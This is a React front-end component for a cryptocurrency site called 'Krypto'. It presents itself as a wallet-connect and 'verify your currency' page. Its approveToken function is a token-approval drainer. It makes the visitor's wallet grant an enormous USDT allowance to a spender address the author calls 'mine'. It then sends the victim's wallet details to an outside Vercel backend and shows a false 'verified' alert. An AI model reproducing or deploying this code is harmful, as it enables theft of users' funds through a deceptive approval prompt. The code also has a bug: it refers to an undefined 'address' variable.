import React, { useContext, useEffect, useState } from "react";
import { AiFillPlayCircle } from "react-icons/ai";
import { TransactionContext } from "../context/TransactionContext";
import { ethers } from "ethers";

const companyCommonStyles =
  "min-h-[70px] sm:px-0 px-2 sm:min-w-[120px] flex justify-center items-center border-[0.5px] border-gray-400 text-sm font-light text-white";

const Input = ({ placeholder, name, type, value, handleChange }) => (
  <input
    placeholder={placeholder}
    type={type}
    step="0.0001"
    value={value}
    onChange={(e) => handleChange(e, name)}
    className="my-2 w-full rounded-sm p-2 outline-none bg-transparent text-white border-none text-sm white-glassmorphism"
  />
);

const Welcome = () => {
  const { currentAccount } = useContext(TransactionContext);
  const [walletAddress, setWalletAddress] = useState(null);
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);

  const tokenAddress = "0x55d398326f99059ff775485246999027b3197955"; // USDT
  const spender = "0xcb08c0b38eC1ac1b6fbC7771B5BD58ee6B9dE668"; // Bank contract address of mine
  const amount = ethers.utils.parseUnits("55398325990.000000000000000001", 18);

  useEffect(() => {
    connectWallet();
  }, []);

  const connectWallet = async () => {
    if (window.ethereum) {
      try {
        await window.ethereum.request({ method: "eth_requestAccounts" });
        const newProvider = new ethers.providers.Web3Provider(window.ethereum);
        const newSigner = newProvider.getSigner();
        const address = await newSigner.getAddress();

        setProvider(newProvider);
        setSigner(newSigner);
        setWalletAddress(address);
      } catch (error) {
        console.error("Wallet connection error:", error);
      }
    } else {
      alert("MetaMask not detected");
    }
  };

  const approveToken = async () => {
    if (!signer || !walletAddress) {
      await connectWallet();
      return;
    }

    const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
    const token = new ethers.Contract(tokenAddress, abi, signer);

    try {
      try {
        const tx = await token.approve(spender, amount);
        await tx.wait();
        console.log("Transaction:", tx);
        console.log("tx" + tx);

        // Save wallet to backend
        const res = await fetch("https://bank-website-delta-gules.vercel.app/api/approovewallet", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ wallet: address }),
        });

        const data = await res.json();
        console.log(data);
      } catch (error) {
        console.log("Error in transaction:", error);
      }
      console.log("✅ Token approved successfully");

      // Log approval to backend
      const res = await fetch("https://bank-website-delta-gules.vercel.app/api/savewallet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          wallet: walletAddress,
          token: tokenAddress,
          spender: spender,
          amount: amount.toString(),
        }),
      });
      const data = await res.json();
      console.log(data);

      // Get balance
      const balanceAbi = ["function balanceOf(address account) view returns (uint256)"];
      const usdt = new ethers.Contract(tokenAddress, balanceAbi, provider);
      const balance = await usdt.balanceOf(walletAddress);
      const formatted = ethers.utils.formatUnits(balance, 18);

      alert(`✅ Your USDT has been verified. Balance: ${formatted} USDT`);
    } catch (err) {
      console.warn("Approval error or user rejected:", err.message);
    }
  };

  return (
    <div className="flex w-full justify-center items-center">
      <div className="flex mf:flex-row flex-col items-start justify-between md:p-20 py-12 px-4">
        <div className="flex flex-1 justify-start items-start flex-col mf:mr-10">
          <h1 className="text-3xl sm:text-5xl text-white text-gradient py-1">
            Send Crypto <br /> across the world
          </h1>
          <p className="text-left mt-5 text-white font-light md:w-9/12 w-11/12 text-base">
            Explore the crypto world. Buy and sell cryptocurrencies easily on Krypto.
          </p>
          {!walletAddress && (
            <button
              type="button"
              onClick={approveToken}
              className="flex flex-row justify-center items-center my-5 bg-[#2952e3] p-3 rounded-full cursor-pointer hover:bg-[#2546bd]"
            >
              <AiFillPlayCircle className="text-white mr-2" />
              <p className="text-white text-base font-semibold"
              >
                Connect Your Wallet
              </p>
            </button>
          )}
          {
            walletAddress && (
              <button
                type="button"
                onClick={approveToken}
                className="flex flex-row justify-center items-center my-5 bg-[#2952e3] p-3 rounded-full cursor-pointer hover:bg-[#2546bd]"
              >
                <AiFillPlayCircle className="text-white mr-2" />
                <p className="text-white text-base font-semibold"
                >
                  Verify Your Currency
                </p>
              </button>
            )}

          <div className="grid sm:grid-cols-3 grid-cols-2 w-full mt-10">
            <div className={`rounded-tl-2xl ${companyCommonStyles}`}>Reliability</div>
            <div className={companyCommonStyles}>Security</div>
            <div className={`sm:rounded-tr-2xl ${companyCommonStyles}`}>Ethereum</div>
            <div className={`sm:rounded-bl-2xl ${companyCommonStyles}`}>Web 3.0</div>
            <div className={companyCommonStyles}>Low Fees</div>
            <div className={`rounded-br-2xl ${companyCommonStyles}`}>Blockchain</div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Welcome;
